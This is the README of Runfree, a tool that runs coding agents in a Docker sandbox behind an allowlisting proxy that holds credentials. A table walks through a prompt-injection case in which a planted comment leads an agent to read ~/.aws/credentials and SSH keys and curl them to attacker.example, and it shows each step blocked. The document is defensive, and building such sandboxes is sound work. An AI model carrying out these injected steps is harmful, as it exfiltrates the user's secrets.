<p align="center">
  <img src="docs/logo.png" alt="Runfree logo" width="200" />
</p>
<h1 align="center">Runfree</h1>
<h3 align="center">Let your coding agent run without permission prompts, in a container with no open internet and none of your credentials</h3>
<p align="center">
<a href="https://github.com/genged/runfree/actions/workflows/test.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/test.yml/badge.svg" alt="Test status" />
</a>
<a href="https://github.com/genged/runfree/actions/workflows/release.yml">
  <img src="https://github.com/genged/runfree/actions/workflows/release.yml/badge.svg" alt="Release status" />
</a>
<a href="https://github.com/genged/runfree/releases/latest">
  <img src="https://img.shields.io/github/v/release/genged/runfree?sort=semver" alt="Latest release" />
</a>
<img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" />
</p>

Runfree starts Claude Code, Codex, or Pi inside a per-project Docker workspace.
Claude Code and Codex run with their permission prompts off, because the
container is the sandbox. The container has no route to the internet except a
proxy, which allows only the exact hostnames you approved on the host and
attaches your real service credentials itself. The agent never holds them.

- **No prompt-babysitting.** The agent edits files, installs packages, and runs
  tests without asking. It does that in a container, not in your shell.
- **Deny-by-default network.** Outbound HTTPS/WSS reaches only hosts you
  approved. The agent can edit the policy file; editing it grants nothing.
- **Credentials stay out of reach.** An API key or access token comes from
  `gh auth token`, 1Password, or an environment variable on your host. The
  agent's environment gets a placeholder.
- **Writes can wait for you.** Set a host to hold write requests until you run
  `runfree approve <id>` on the host.

```bash
brew install genged/tap/runfree
cd ~/code/my-project
runfree init
runfree
```

`runfree init` opens a short wizard. It detects the project's package
ecosystems, Git remote hosts, and a GitHub CLI login, then offers a plan you
review before any policy or credential source is written.

Requires Apple Silicon macOS and Docker Desktop. Each claim above has a limit
worth knowing before you rely on it: see [Limitations](#limitations).

## Why

A coding agent is useful because it can read your code, edit it, install
packages, run tests, and call APIs. Run it directly on your machine and all of
that happens with your shell's reach and your credentials, so one prompt injection,
one confused tool call, or one bad suggestion acts with everything you have.
The usual answer is a permission prompt for every command, which you either
babysit or switch off.

Runfree moves the boundary instead. When the agent reaches for a host you have
not approved, the request is refused and `runfree doctor` prints which host it
was and the exact command that would allow it.

## What that looks like

An agent is fixing a failing build. It reads an issue comment, or a README
inside a dependency, that carries instructions aimed at it: collect this
machine's cloud keys and GitHub token and send them to `attacker.example`.
With prompts off on your host, that is three commands. Inside Runfree:

| The injected step | What happens |
| --- | --- |
| `cat ~/.aws/credentials`, `cat ~/.ssh/id_rsa` | File not found. Your home directory is not mounted. |
| `printenv`, looking for a GitHub token | A placeholder. The real value is held by the proxy. |
| `curl https://attacker.example` | 403 from the proxy, before any DNS lookup. |
| Connect straight to an IP address, skipping the proxy | No route. |
| Edit `.runfree/network-policy.json` to allow the host | No effect without your approval on the host. |

Afterwards, `runfree doctor` lists `attacker.example` among the blocked hosts.

The same injection can still do two things. It can change files in your working
tree, and it can send data to a host you already allowed, for example by pushing
to a repository on an allowed Git host. `--write ask` and `--deny-git-push` on
`runfree host rules` narrow the second. The full table is
[What Stops What](docs/security.md#what-stops-what).

## Who it is for

Individual developers running Claude Code, Codex, or Pi on their own projects,
who want the agent's tools in a container and their service credentials out of
its reach. Teams can commit policy and review it like code (see
[`docs/team-workflow.md`](docs/team-workflow.md)), but the primary case is one
developer and one project.

Runfree is not a VM boundary, not a cloud service, and not a substitute for
reading what an agent wrote. It narrows the default blast radius.

## Quickstart

### 1. Install

Runfree publishes **Apple Silicon macOS** binaries and is supported with
**Docker Desktop**. You also need `git`: Git 2.48 or newer gives full
worktree support. Older Git still works, with limits described in
[Git worktrees](docs/cli.md#git-worktrees).

```bash
brew install genged/tap/runfree
```

Without Homebrew:

```bash
curl -fsSL https://raw.githubusercontent.com/genged/runfree/main/scripts/install.sh | bash
```

That downloads the latest release for your architecture, verifies its SHA-256
checksum against the published manifest, and installs to `~/.local/bin/runfree`.
It needs `bash`, not `sh`.

To build from source instead, you need Node 22, pnpm 10.28.0, and Bun 1.3.14:

```bash
pnpm install --frozen-lockfile
pnpm run build:bin
./dist/runfree version
```

Intel macOS and Linux have no published binaries. They can be built from source;
building is not a support claim.

### 2. Initialize a project

```bash
cd ~/code/my-project
runfree init
```

`init` writes project-local config and deny-all desired policy:

```text
.runfree/
  .gitignore
  runfree.json
  network-policy.json
```

On a terminal it then continues into the wizard. Each item it offers is one you
can untick: a curated service for each ecosystem it found (a lockfile or
manifest is enough), the Git remote's host, and, when `gh` is installed, a
`github-cli` credential source bound to the `github` service. `runfree init --yes`
and non-interactive runs write the files above and skip the wizard.

Runtime state lives outside the repository, under your XDG state root, for
example `~/.local/state/runfree/projects/<project-hash>/`.

### 3. Run an agent

```bash
runfree          # the configured default agent
runfree claude
runfree codex
runfree pi
```

The first start asks you to review the policy before anything runs. Starting
Claude or Codex includes its credentialless operational service in that review,
so the login and model hosts are allowed without configuring credential injection.
Pi's provider setup stays explicit.

Around a session:

```bash
runfree status
runfree shell
runfree doctor            # why a request was blocked, and what would allow it
runfree logs proxy --verbose
runfree stop
```

### 4. Add network access and credentials

The wizard covers the common cases. Everything it does is also a command, for
changes after `init` or for projects set up without it.

Credentials are resolved on the host and injected only by the proxy. To reuse a
GitHub CLI login without the credential entering the container:

```bash
runfree credential source add github-cli -- gh auth token
runfree service enable github --from-source github-cli
```

To allow a single host, read-only:

```bash
runfree host add api.example.com --read-only
runfree host explain api.example.com
```

To let the agent use a service that runs on your machine's loopback (a dev
server, a database, a model server, a device bridge), approve its port. New
sessions reach it at `127.0.0.1:<port>`, with the client unchanged:

```bash
runfree host-service add <name> --port <port>
runfree host-service list
```

See [Host Services](docs/cli.md#host-services) for the checks and limits.

To discover what a project actually needs, during a trusted onboarding task:

```bash
runfree up --audit-network=30m
runfree audit report          # suggests exact host add commands; never edits policy
runfree audit off
```

[`docs/cli.md`](docs/cli.md) is the full command reference.
`runfree help <topic>` has task guides.

## Also included

- **Curated services.** One command allows a whole ecosystem's hosts instead of
  hunting hostnames: `runfree service enable node`, `python`, `github`, and
  more. `runfree service list --all` prints them. See
  [Services](docs/cli.md#services).
- **Approve-on-write.** `runfree host rules api.example.com --write ask` holds
  writes to that host; `runfree approvals --watch` shows them and
  `runfree approve <id>` decides, for one request or for the session. See
  [Approve-On-Write](docs/cli.md#approve-on-write).
- **Credential sources.** Host commands, environment variables, 1Password
  refs, stdin, and signed JWTs. See [Credentials](docs/cli.md#credentials).
- **MCP servers.** `runfree mcp enable <agent> <server>` reviews the endpoint,
  credential, and OAuth hosts once, then runs the login. See
  [MCP](docs/cli.md#mcp).
- **Resume.** `runfree resume` picks up interrupted Claude, Codex, or Pi work
  for the project.
- **Preview and paste.** `runfree forward 3000` publishes a dev server the
  agent runs to your loopback; `runfree inbox paste` hands the agent a
  clipboard image. See
  [Optional Runtime Helpers](docs/cli.md#optional-runtime-helpers).
- **Clean checkout.** Dependency directories such as `node_modules` live in
  Runfree-owned volumes, and `.runfree/image/Dockerfile` extends the base image
  with project tooling.

## How it works

The agent container is untrusted. The proxy container is the trust boundary.
The host owns approval.

```text
 HOST (trusted: you and the runfree CLI)
   approvals, effective policy, credential sources
        |                                    |
        | starts and admits sessions         | policy and credentials
        v                                    v
 +---------------------------+       +---------------------------+
 | agent container           |       | proxy container           |
 | UNTRUSTED                 |       | TRUST BOUNDARY            |
 |                           |       |                           |
 | Claude Code / Codex / Pi  | HTTPS | 1. exact-host allowlist   |
 | /workspace (your project) |  WSS  | 2. per-host request rules |     approved
 | placeholders, no real     |------>| 3. write approval         |---> hosts
 | credentials               |       | 4. attach credential      |     only
 +---------------------------+       +---------------------------+
        X no direct egress, no route to the host gateway
```

- Direct agent egress and host-gateway egress are blocked by Docker topology.
- Outbound HTTPS/WSS goes through the proxy, which checks the allowlist, then
  the per-host request rules, then write approval, and only then reads a credential.
- Desired policy is writable from the container; effective policy is not
  reachable from it.
- Dependency directories live in Runfree-owned volumes rather than your
  checkout.

That is what makes the confused-deputy case bounded: a compromised agent can ask
for an allowed request, but it cannot read the proxy-held credential or widen the
policy from inside the container.

See [`docs/architecture.md`](docs/architecture.md) for the runtime model.

### How it is tested

`make test-runtime-core` runs against a real Docker daemon and proves the trust
boundary: the network shape and dropped capabilities, egress containment,
request rules and write approval, that policy edits from the agent are inert,
and per-session admission. A security test has to show the refusal happens
before the side effect: before a DNS lookup, an upstream connection, or a
credential read.

[What Stops What](docs/security.md#what-stops-what) maps each attack to the
control that stops it. [What Runfree Does Not Prove](docs/security.md#what-runfree-does-not-prove)
lists the gaps, including that the live suite runs by hand on a Docker host and
is not part of the release pipeline.

## Limitations

Worth reading before you rely on it. The full threat model is
[`docs/security.md`](docs/security.md).

- **Your working tree is writable**, including `.git`. Runfree bounds the
  network, not the repository.
- **Native Claude and Codex logins are not proxy-held.** They live in
  per-project agent state, inside the agent's reach. Only proxy-managed service
  credentials get that boundary.
- **An allowed host stays allowed.** Policy controls destination and request
  shape, not the content of what an agent sends to a destination you approved.
  A broad multi-tenant host is a broad allowance.
- **Project image builds run before the sandbox exists**, on the host Docker
  daemon. Review project Dockerfiles as host-side decisions.
- **Audit mode widens what the agent can reach** while it is on. It is a
  time-boxed discovery tool, not a default.
- **Docker and the host are trusted.** This is not VM isolation.

## Project status

Runfree is a security-sensitive beta. The latest release is the only supported
line, on a best-effort basis with no response-time commitment.

Implemented: the Docker/proxy runtime, exact-host network policy, proxy-held
static credentials, OAuth handle mediation, MCP import and approval, dependency
overlays, approve-on-write, audit mode, interrupted-session recovery, and
Homebrew packaging.

Not in this release: Linux and Intel macOS binaries, prebuilt runtime images,
npm distribution, and artifact provenance attestations. OrbStack is not tested
or supported.

The published binary is ad-hoc signed, not notarized. Install with Homebrew or
`scripts/install.sh` — both fetch over curl, which sets no quarantine
attribute. If you download the tarball in a browser instead, macOS quarantines
it and Gatekeeper refuses to run it. Verify what you downloaded against the
release's SHA-256 manifest.

Please do not open a public issue for a suspected vulnerability. Use GitHub
private vulnerability reporting, as described in [`SECURITY.md`](SECURITY.md).

## Development

```bash
pnpm install --frozen-lockfile
make test
```

Runtime, proxy, firewall, mount, or credential changes also need a Docker host
and `make test-runtime-core`. [`CONTRIBUTING.md`](CONTRIBUTING.md) has the
rest, including what review will ask about.

## Further reading

- [`docs/index.md`](docs/index.md) — the documentation map
- [`docs/project-brief.md`](docs/project-brief.md) — product model and release scope
- [`docs/architecture.md`](docs/architecture.md) — runtime, proxy, policy, and state
- [`docs/security.md`](docs/security.md) — threat model and verification
- [`docs/cli.md`](docs/cli.md) — full command reference
- [`docs/troubleshooting.md`](docs/troubleshooting.md) — refusals and recovery
- [`docs/whats-new-0.5.2.md`](docs/whats-new-0.5.2.md) — current release
- [`AGENTS.md`](AGENTS.md) — guidance for coding agents working in this repo
